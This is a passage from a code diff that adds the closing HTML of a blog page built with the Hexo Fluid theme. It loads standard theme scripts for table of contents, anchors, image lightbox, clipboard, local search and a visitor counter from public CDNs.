+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
